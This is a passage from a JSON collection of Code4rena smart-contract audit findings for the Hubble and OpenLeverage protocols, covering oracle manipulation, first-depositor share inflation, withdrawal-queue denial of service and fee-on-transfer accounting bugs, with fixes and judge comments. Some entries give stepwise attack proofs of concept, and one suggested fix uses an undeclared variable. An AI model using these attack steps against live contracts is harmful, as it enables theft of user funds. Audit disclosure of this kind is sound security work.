non-zero Oracle price check, possibly add an additional Oracle feed information usage to control that the price is fresh. Please consult the Chainlink for that as OCR introduction might have changed the state of the art approach (i.e. whether and how to use latestRoundData returned data):\n\n<https://docs.chain.link/docs/off-chain-reporting/>\n\nRegarding any price spikes it is straightforward to construct a mitigation mechanics for such cases, so the system will be affected by sustainable price movements only.\n\nAs price outrages provide a substantial attack surface for the project it's worth adding some complexity to the implementation.\n\nOne of the approaches is to track both current and TWAP prices, and condition all state changing actions, including liquidations, on the current price being within a threshold of the TWAP one. If the liquidation margin level is conservative enough and TWAP window is small enough this is safe for the overall stability of the system, while providing substantial mitigation mechanics by allowing state changes on the locally calm market only.\n\nAnother approach is to introduce time delay between liquidation request and actual liquidation. Again, conservative enough margin level plus small enough delay keeps the system safe, while requiring that market conditions allow for liquidation both at request time and at execution time provides ample filtration against price feed outbreaks\n\n**[atvanguard (Hubble) confirmed](https://github.com/code-423n4/2022-02-hubble-findings/issues/46)**\n\n**[moose-code (judge) decreased severity from High to Medium](https://github.com/code-423n4/2022-02-hubble-findings/issues/46)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns an issue in the Oracle.sol contract which could allow a malicious user to liquidate a healthy position if the price feed is manipulated or there is any malfunction based volatility on the market. The issue occurs in the Oracle.getUnderlyingPrice function and is used in liquidation triggers providing isLiquidatable and _getLiquidationInfo functions. The recommended mitigation steps include adding a non-zero Oracle price check, possibly adding an additional Oracle feed information usage to control that the price is fresh, and constructing a mitigation mechanics for price spikes. This could involve tracking both current and TWAP prices, and condition all state changing actions, including liquidations, on the current price being within a threshold of the TWAP one. Another option is to introduce a time delay between liquidation request and actual liquidation. The Chainlink documentation can provide more information on the implementation of these mitigation steps.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/46",
      "tags": [],
      "finders": [
        "csanuragjain",
        "pauliax",
        "cccz",
        "leastwood",
        "WatchPug",
        "0x1f8b",
        "hyh",
        "hubble",
        "ye0lde",
        "defsec"
      ]
    },
    {
      "id": "1517",
      "title": "[H-03] InsuranceFund depositors can be priced out & deposits can be stolen",
      "impact": "HIGH",
      "content": "_Submitted by cmichel, also found by danb_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/InsuranceFund.sol#L44-L54><br>\n\nThe `InsuranceFund.deposit` function mints initial `shares` equal to the deposited amount.<br>\nThe deposit / withdraw functions also use the VUSD contract balance for the shares computation. (`balance() = vusd.balanceOf(address(this))`)\n\nIt's possible to increase the share price to very high amounts and price out smaller depositors.\n\n### Proof of Concept\n\n*   `deposit(_amount = 1)`: Deposit the smallest unit of VUSD as the first depositor. Mint 1 share and set the total supply and VUSD balance to `1`.\n*   Perform a direct transfer of `1000.0` VUSD to the `InsuranceFund`. The `balance()` is now `1000e6 + 1`\n*   Doing any deposits of less than `1000.0` VUSD will mint zero shares: `shares = _amount * _totalSupply / _pool = 1000e6 * 1 / (1000e6 + 1) = 0`.\n*   The attacker can call `withdraw(1)` to burn their single share and receive the entire pool balance, making a profit. (`balance() * _shares / totalSupply() = balance()`)\n\nI give this a high severity as the same concept can be used to always steal the initial insurance fund deposit by frontrunning it and doing the above-mentioned steps, just sending the frontrunned deposit amount to the contract instead of the fixed `1000.0`.\nThey can then even repeat the steps to always frontrun and steal any deposits.\n\n### Recommended Mitigation Steps\n\nThe way [UniswapV2 prevents this](https://github.com/Uniswap/v2-core/blob/4dd59067c76dea4a0e8e4bfdda41877a6b16dedc/contracts/UniswapV2Pair.sol#L121) is by requiring a minimum deposit amount and sending `1000` initial shares to the zero address to make this attack more expensive.\nThe same mitigation can be done here.\n\n**[atvanguard (Hubble) confirmed](https://github.com/code-423n4/2022-02-hubble-findings/issues/42)**\n\n\n\n***\n \n",
      "summary": "\nThis bug report is about a vulnerability in the InsuranceFund.sol contract, which is part of the 2022-02-hubble repository on GitHub. The vulnerability allows attackers to increase the share price to very high amounts and price out smaller depositors. An attacker can call the deposit and withdraw functions to mint zero shares and receive the entire pool balance, making a profit. The recommended mitigation steps are to require a minimum deposit amount and sending initial shares to the zero address, like UniswapV2 does to make the attack more expensive.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/42",
      "tags": [
        "First Depositor Issue"
      ],
      "finders": [
        "danb",
        "cmichel"
      ]
    },
    {
      "id": "1516",
      "title": "[H-02] denial of service",
      "impact": "HIGH",
      "content": "_Submitted by danb, also found by cmichel, csanuragjain, hyh, kirk-baird, leastwood, Meta0xNull, minhquanym, Omik, robee, Ruhum, and throttle_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L53><br>\n\nprocessWithdrawals can process limited amount in each call.<br>\nAn attacker can push to withdrawals enormous amount of withdrawals with amount = 0.<br>\nIn order to stop the dos attack and process the withdrawal, the governance needs to spend as much gas as the attacker.<br>\nIf the governance doesn't have enough money to pay for the gas, the withdrawals can't be processed.\n\n### Proof of Concept\n\nAlice wants to attack vusd, she spends 1 millions dollars for gas to push as many withdrawals of amount = 0 as she can.<br>\nIf the governance wants to process the deposits after Alices empty deposits, they also need to spend at least 1 million dollars for gas in order to process Alice's withdrawals first.<br>\nBut the governance doesn't have 1 million dollars so the funds will be locked.\n\n### Recommended Mitigation Steps\n\nSet a minimum amount of withdrawal. e.g. 1 dollar\n\n        function withdraw(uint amount) external {\n            require(amount >= 10 ** 6);\n            burn(amount);\n            withdrawals.push(Withdrawal(msg.sender, amount));\n        }\n\n**[atvanguard (Hubble) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/119#issuecomment-1049473996):**\n > Confirming this is an issue. Would classify it as `2 (Med Risk)` because this attack is expensive to carry out.\n\n**[atvanguard (Hubble) resolved](https://github.com/code-423n4/2022-02-hubble-findings/issues/119)**\n\n**[moose-code (judge) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/119#issuecomment-1059971562):**\n > Would be interested to see the exact gas cost of executing withdraw. The thing is the grievance costs only gas to execute and the withdraw function is relatively cheap from first glance. The main issue here is that it can become SUPER expensive to clear the que in gas. I.e. if the attacker builds up a que of 200 withdrawals, some unknowning sucker is going to pay for more than 200 erc20 transfers in order to get their money out. Thats more than anyone would want to pay, and further since so much gas limit would be needed for this to be executed, to fit into a block you are going to have to pay a huge price. \n> \n> So basically it costs attacker x to execute, which means it is also going to cost next user likely even more than x to fix the problem. \n> \n> Also the que is not cleared so processWithdrawals becomes a really expensive function. If the items were cleared and set back to zero it would make it less expensive to de-que the que. \n> \n> This being said we definitely have this at at least medium severity. \\$10k in gas to constantly brick users withdrawls from protocol for a week is a serious issue and not the biggest cost for an attack. \n> \n> @JasoonS, going to put this as medium. Let's discuss whether we want to have it as high. \n\n**[moose-code (judge) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/119#issuecomment-1059983807):**\n > Okay, going to keep this as high severity. The cost to fix the attack can be more than what the attack costs in total. It also burdens a random unsuspecting user with a really high gas cost to try and get their withdrawal. There are many good suggestions on how to fix this. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the VUSD.sol code. The code is located at https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L53. The vulnerability is that the processWithdrawals function can only process a limited amount in each call and an attacker can push to withdrawals with an amount of 0. This means that the governance would have to spend as much gas as the attacker in order to prevent the DoS attack and process the withdrawal. If the governance does not have enough money to pay for the gas, the withdrawals cannot be processed. As a proof of concept, Alice spends 1 million dollars for gas to push as many withdrawals of amount = 0 as she can. The recommended mitigation step is to set a minimum amount of withdrawal, for example 1 dollar, and add a require statement to the withdraw function.",
      "quality_score": 4.833333333333333,
      "rarity_score": 4.75,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/119",
      "tags": [
        "Denial-Of-Service",
        "Withdraw 0",
        "Grief Attack"
      ],
      "finders": [
        "csanuragjain",
        "danb",
        "cmichel",
        "robee",
        "minhquanym",
        "leastwood",
        "Meta0xNull",
        "Ruhum",
        "throttle",
        "Omik",
        "kirk-baird",
        "hyh"
      ]
    },
    {
      "id": "1515",
      "title": "[H-01] Update initializer modifier to prevent reentrancy during initialization",
      "impact": "HIGH",
      "content": "_Submitted by Dravee_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/package.json#L17><br>\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/legos/Governable.sol#L5><br>\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/legos/Governable.sol#L24>\n\nWhile Governable.sol is out of scope, I figured this issue would still be fair game.\n\nThe solution uses: `\"@openzeppelin/contracts\": \"4.2.0\"`.<br>\nThis dependency has a known high severity vulnerability: <https://security.snyk.io/vuln/SNYK-JS-OPENZEPPELINCONTRACTS-2320176><br>\nWhich makes this contract vulnerable:\n\n    File: Governable.sol\n    05: import { Initializable } from \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n    ...\n    24: contract Governable is VanillaGovernable, Initializable {}\n\nThis contract is inherited at multiple places:\n\n    contracts/AMM.sol:\n      11: contract AMM is IAMM, Governable {\n\n    contracts/InsuranceFund.sol:\n      13: contract InsuranceFund is VanillaGovernable, ERC20Upgradeable {\n\n    contracts/Oracle.sol:\n      11: contract Oracle is Governable {\n\n    contracts/legos/HubbleBase.sol:\n      15: contract HubbleBase is Governable, Pausable, ERC2771Context {\n\n    contracts/ClearingHouse.sol:\n      11: contract ClearingHouse is IClearingHouse, HubbleBase {\n\n    contracts/MarginAccount.sol:\n      25: contract MarginAccount is IMarginAccount, HubbleBase {\n\nnitializer()\\` is used here:\n\n```\ncontracts/AMM.sol:\n  99:     ) external initializer {\n\ncontracts/ClearingHouse.sol:\n  44:     ) external initializer {\n\ncontracts/MarginAccount.sol:\n  124:     ) external initializer {\n\ncontracts/Oracle.sol:\n  20:     function initialize(address _governance) external initializer {\n\n```\n\n### Recommended Mitigation Steps\n\nUpgrade `@openzeppelin/contracts` to version 4.4.1 or higher.\n\n**[atvanguard (Hubble) confirmed and resolved](https://github.com/code-423n4/2022-02-hubble-findings/issues/81)**\n\n**[moose-code (judge) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/81#issuecomment-1059916859):**\n > Agreed. Other issues such as [this](https://forum.openzeppelin.com/t/security-advisory-initialize-uups-implementation-contracts/15301) have also popped up, so always safest to be on the newest OZ. This includes for contracts and contracts-upgradeable packages.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Governable.sol contract, which is used in multiple places in the code. The vulnerability is due to the use of an outdated version of the \"@openzeppelin/contracts\" dependency. This vulnerability could allow attackers to exploit the `initializer()` function in the contracts AMM.sol, ClearingHouse.sol, MarginAccount.sol, and Oracle.sol.\n\nIn order to mitigate this vulnerability, it is recommended to upgrade the \"@openzeppelin/contracts\" dependency to version 4.4.1 or higher. This should be done as soon as possible in order to prevent any potential exploits.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/81",
      "tags": [],
      "finders": [
        "Dravee"
      ]
    },
    {
      "id": "42443",
      "title": "[M-04] OpenLevV1.closeTrade with V3 DEX doesn't correctly accounts fee on transfer tokens for repayments",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\nThe amount that OpenLevV1 will receive can be less than V3 DEX indicated as a swap result, while it is used as given for position debt repayment accounting.\n\nThis way actual funds received can be less than accounted, leaving to system funds deficit, which can be exploited by a malicious user, draining contract funds with multiple open/close with a taxed token.\n\nIn the `trade.depositToken != longToken` case when `flashSell` is used this can imply inability to send remainder funds to a user and the failure of the whole closeTrade function, the end result is a freezing of user's funds within the system.\n\n#### Proof of Concept\n\n`trade.depositToken != longToken` case, can be wrong repayment accounting, which will lead to a deficit if the received funds are less than DEX returned `closeTradeVars.receiveAmount`.\n\nAs a side effect, `doTransferOut` is done without balance check, so the whole position close can revert, leading to inability to close the position and freeze of user's funds this way:\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L197-204>\n\nI.e. if there is enough funds in the system they will be drained, if there is not enough funds, user's position close will fail.\n\nV3 sell function doesn't check for balance change, using DEX returned amount as is:\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/dex/eth/UniV3Dex.sol#L61-70>\n\n#### Recommended Mitigation Steps\n\nIf fee on tranfer tokens are fully in scope, do control all the accounting and amounts to be returned to a user via balance before/after calculations for DEX V3 logic as well.\n\n**[ColaM12 (OpenLeverage) confirmed and resolved](https://github.com/code-423n4/2022-01-openleverage-findings/issues/104)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/104#issuecomment-1045996325):**\n > Awesome find. I was able to confirm that `UniV3Dex.uniV3Sell()` does not properly handle fee-on-transfer tokens by treating the amount received as the difference between before balance and after balance.\n\n\n\n***\n\n",
      "summary": "\nThe report describes a bug in the OpenLeverageV1 system where the amount received by the system can be less than the amount indicated by the V3 DEX swap result. This can lead to a deficit in the system, which can be exploited by a malicious user to drain contract funds. The bug occurs when the `trade.depositToken` is not equal to the `longToken` and the `flashSell` function is used. This can result in the inability to send remaining funds to the user and the failure of the `closeTrade` function, causing the user's funds to be frozen. The bug has been confirmed and resolved by the OpenLeverage team. A recommended mitigation step is to control all accounting and amounts to be returned to the user before and after DEX V3 logic. It was also found that the `UniV3Dex.uniV3Sell()` function does not properly handle fee-on-transfer tokens, which was confirmed by a judge.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/104",
      "tags": [],
      "finders": []
    },
    {
      "id": "42442",
      "title": "[M-01] `UniV2ClassDex.sol#uniClassSell()` Tokens with fee on transfer are not fully supported",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L31-L56>\n\n```solidity\nfunction uniClassSell(DexInfo memory dexInfo,\n    address buyToken,\n    address sellToken,\n    uint sellAmount,\n    uint minBuyAmount,\n    address payer,\n    address payee\n) internal returns (uint buyAmount){\n    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);\n    IUniswapV2Pair(pair).sync();\n    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();\n    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);\n    uint balanceBefore = IERC20(buyToken).balanceOf(payee);\n    dexInfo.fees = getPairFees(dexInfo, pair);\n    if (buyToken < sellToken) {\n        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");\n    } else {\n        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");\n    }\n\n    require(buyAmount >= minBuyAmount, 'buy amount less than min');\n    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);\n    return bought;\n}\n```\n\nWhile `uniClassBuy()` correctly checks the actually received amount by comparing the before and after the balance of the receiver, `uniClassSell()` trusted the result given by `getAmountOut()`. This makes `uniClassSell()` can result in an output amount fewer than `minBuyAmount`.\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L101-L102>\n\n#### Recommendation\n\nChange to:\n\n```solidity\nfunction uniClassSell(DexInfo memory dexInfo,\n    address buyToken,\n    address sellToken,\n    uint sellAmount,\n    uint minBuyAmount,\n    address payer,\n    address payee\n) internal returns (uint bought){\n    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);\n    IUniswapV2Pair(pair).sync();\n    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();\n    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);\n    uint balanceBefore = IERC20(buyToken).balanceOf(payee);\n    dexInfo.fees = getPairFees(dexInfo, pair);\n    if (buyToken < sellToken) {\n        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");\n    } else {\n        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");\n    }\n    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);\n    require(bought >= minBuyAmount, 'buy amount less than min');\n}\n```\n\n**[ColaM12 (OpenLeverage) confirmed and resolved](https://github.com/code-423n4/2022-01-openleverage-findings/issues/208)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/208#issuecomment-1050844620):**\n > Agree with this finding! Uniswap token swaps are meant to support all types of tokens. It does seem possible for there to be `payer` to experience increased slippage because the check operates on `getAmountOut()` and not the `bought` output.\n >\n > It's fair to say that this will lead to value leakage, so I think `medium` severity is justified.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a function called `uniClassSell()` in a contract called `UniV2ClassDex.sol`. This function is used for selling tokens on a decentralized exchange. The bug was found by a user named WatchPug and reported on GitHub.\n\nThe code for `uniClassSell()` is shown in lines 31-56 of the contract. The function is supposed to check the amount of tokens received by the seller and make sure it is not less than the minimum amount they want to receive. However, the code only checks the result given by a function called `getAmountOut()`, which can sometimes be incorrect. This means that the seller could end up receiving less than the minimum amount they expected.\n\nThe recommended solution is to change the code to also check the actual amount received by comparing the before and after balance of the seller. This will ensure that the seller always receives the minimum amount they expect.\n\nThe bug has been confirmed and resolved by a user named ColaM12 from the OpenLeverage team. Another user named 0xleastwood, who is a judge, also commented on the bug and agreed with the finding. They stated that this bug could lead to value leakage and suggested that a medium severity rating is appropriate.\n\nThis bug report serves as a reminder to always thoroughly test and check for potential errors in code, especially when dealing with financial transactions. It also shows the importance of reporting and fixing bugs to ensure the safety and reliability of smart contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/208",
      "tags": [],
      "finders": []
    },
    {
      "id": "42441",
      "title": "[H-01] OpenLevV1Lib's and LPool's `doTransferOut` functions call native `payable.transfer`, which can be unusable for smart contract calls",
      "impact": "HIGH",
      "content": "_Submitted by hyh_\n\nWhen OpenLev operations use a wrapped native token, the whole user withdraw is being handled with a `payable.transfer()` call.\n\nThis is unsafe as `transfer` has hard coded gas budget and can fail when the user is a smart contract. This way any programmatical usage of OpenLevV1 and LPool is at risk.\n\nWhenever the user either fails to implement the payable fallback function or cumulative gas cost of the function sequence invoked on a native token transfer exceeds 2300 gas consumption limit the native tokens sent end up undelivered and the corresponding user funds return functionality will fail each time.\n\nAs OpenLevV1 `closeTrade` is affected this includes user's principal funds freeze scenario, so marking the issue as a high severity one.\n\n#### Proof of Concept\n\nOpenLevV1Lib and LPool have `doTransferOut` function that calls native token payable.transfer:\n\nOpenLevV1Lib.doTransferOut\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1Lib.sol#L253>\n\nLPool.doTransferOut\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L297>\n\nLPool.doTransferOut is used in LPool redeem and borrow, while OpenLevV1Lib.doTransferOut is used in OpenLevV1 trade manipulation logic:\n\ncloseTrade\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L204>\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L215>\n\nliquidate\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L263>\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L295>\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L304>\n\n#### References\n\nThe issues with `transfer()` are outlined here:\n\n<https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/>\n\n#### Recommended Mitigation Steps\n\nOpenLevV1's `closeTrade` and `liquidate` as well as LPool's `redeem`, `redeemUnderlying`, `borrowBehalf`, `repayBorrowBehalf`, `repayBorrowEndByOpenLev` are all `nonReentrant`, so reentrancy isn't an issue and `transfer()` can be just replaced.\n\nUsing low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised:\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60>\n\n**[ColaM12 (OpenLeverage) confirmed and resolved](https://github.com/code-423n4/2022-01-openleverage-findings/issues/75)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/75#issuecomment-1045627508):**\n > Awesome find! Completely agree with the warden here. This would prevent users from calling sensitive functions which withdraw their funds in some way. \n\n\n\n***\n\n \n",
      "summary": "\nThe report discusses a bug in the OpenLevV1 and LPool contracts. When a user withdraws their funds using a wrapped native token, the `payable.transfer()` function is used. However, this function is unsafe as it has a hardcoded gas budget and can fail when the user is a smart contract. This can cause the user's funds to not be delivered and can lead to the failure of important functions such as `closeTrade` and `liquidate`. The report recommends replacing `transfer()` with a safer alternative such as `call.value(amount)` or using the OpenZeppelin `Address.sendValue` function. This issue has been confirmed and resolved by the team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/75",
      "tags": [],
      "finders": []
    },
    {
      "id": "1358",
      "title": "[M-05] anti-flashloan mechanism may lead to protocol default",
      "impact": "MEDIUM",
      "content": "_Submitted by gzeon_\n\nThere is a price check to avoid flash loan attacks which significantly moved the price. If current price is 5% lower than the stored twap price, the liquidation will fail. This design can be dangerous as it is to openleverage's benefit to close under-collateralized position ASAP when there is a huge market drawdown. When the market keep trading downward, it is possible that the spot price keep trading 5% lower than the twap, which prevent any liquidation from happening and causing the protocol to be under-collateralized.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/OpenLevV1Lib.sol#L191>\n\n```solidity\n// Avoid flash loan\nif (prices.price < prices.cAvgPrice) {\n    uint differencePriceRatio = prices.cAvgPrice.mul(100).div(prices.price);\n    require(differencePriceRatio - 100 < maxLiquidationPriceDiffientRatio, 'MPT');\n}\n``` \n\n#### Recommended Mitigation Steps\n\nInstead of revert with `maxLiquidationPriceDiffientRatio`, use the twap price to determine if the position is healthy.\n\n**[ColaM12 (OpenLeverage) disputed](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1045995096):**\n > From first impression, this finding seems legitimate. Can I get some more details on why it was disputed? @ColaM12 \n\n**[ColaM12 (OpenLeverage) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046409471):**\n > There is always a chance to front run a flash loan transaction before trading in OpenLev. Also, see in line [196]( https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/OpenLevV1Lib.sol#L196), position is considered not healthy only if all three price check failed including the twap price.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046517723):**\n > It looks like only one condition would need to be satisfied for `isPositionHealthy` to return false as it uses `||` and not `&&`.\n\n**[ColaM12 (OpenLeverage) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046560642):**\n > Do you mean return true? All 3 price checks should fail when liquidating. But the position may still hold funds to pay off debt. by using maxLiquidationPriceDiffientRatio, under-priced-swaps can be limited . Otherwise, all remaining funds in the position could be drained from a flash loan attack which directly leads to a bad debt to lender.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046580257):**\n > Ahh sorry my mistake. I misinterpreted that.\n >\n > I agree with the sponsor here. The issue outlined by the warden seems to be safeguarded by the two other checks in `isPositionHealthy()`\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046623163):**\n > Actually thinking about this more, I think the warden raised an issue related to the liquidations continuing to fail if the price keeps trending downward at an accelerated pace. I don't think the protocol would be able to respond to such events if [this](https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/OpenLevV1Lib.sol#L194) reverts.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046665362):**\n > After discussion with the sponsor, we have agreed that this issue is valid. It is expected that the TWAP is only valid for 1 min. By removing this condition, there is potential for even larger security issues. So the sponsor has decided to make this a wont-fix but I'll keep the issue open as it is valid.\n >\n > This was an awesome find!\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the OpenLeverage protocol, which is used to avoid flash loan attacks. The issue is that if the current spot price is 5% lower than the stored twap price, the liquidation will fail. This can be dangerous as it prevents the protocol from closing under-collateralized positions quickly when there is a huge market drawdown. The proof of concept is a code snippet that checks the current price against the twap price and reverts with a message if it is too low. The recommended mitigation step is to use the twap price to determine if the position is healthy, rather than reverting with a message.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/233",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "1357",
      "title": "[M-04] OpenLevV1.closeTrade with V3 DEX doesnt correctly accounts fee on transfer tokens for repayments",
      "impact": "MEDIUM",
      "content": "## Handle\n\nhyh\n\n\n## Vulnerability details\n\n## Impact\n\nThe amount that OpenLevV1 will receive can be less than V3 DEX indicated as a swap result, while it is used as given for position debt repayment accounting.\n\nThis way actual funds received can be less than accounted, leaving to system funds deficit, which can be exploited by a malicious user, draining contract funds with multiple open/close with a taxed token.\n\nIn the `trade.depositToken != longToken` case when `flashSell` is used this can imply inability to send remainder funds to a user and the failure of the whole closeTrade function, the end result is a freezing of user's funds within the system.\n\n## Proof of Concept\n\n`trade.depositToken != longToken` case, can be wrong repayment accounting, which will lead to a deficit if the received funds are less than DEX returned `closeTradeVars.receiveAmount`.\n\nAs a side effect, `doTransferOut` is done without balance check, so the whole position close can revert, leading to inability to close the position and freeze of user's funds this way:\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L197-204\n\n\nI.e. if there is enough funds in the system they will be drained, if there is not enough funds, user's position close will fail.\n\n\nV3 sell function doesn't check for balance change, using DEX returned amount as is:\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/dex/eth/UniV3Dex.sol#L61-70\n\n## Recommended Mitigation Steps\n\nIf fee on tranfer tokens are fully in scope, do control all the accounting and amounts to be returned to a user via balance before/after calculations for DEX V3 logic as well.",
      "summary": "\nA bug has been reported in OpenLevV1 which can lead to a funds deficit if the amount received is less than the amount indicated by V3 DEX as a swap result. This can be exploited by a malicious user to drain contract funds with multiple open/close with a taxed token. If there are not enough funds in the system, the position close can fail and user's funds can be frozen. The V3 sell function doesn't check for balance change, using DEX returned amount as is. To mitigate this issue, it is recommended to control all the accounting and amounts to be returned to a user via balance before/after calculations for DEX V3 logic.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/104",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1356",
      "title": "[M-03] Eth sent to Timelock will be locked in current implementation",
      "impact": "MEDIUM",
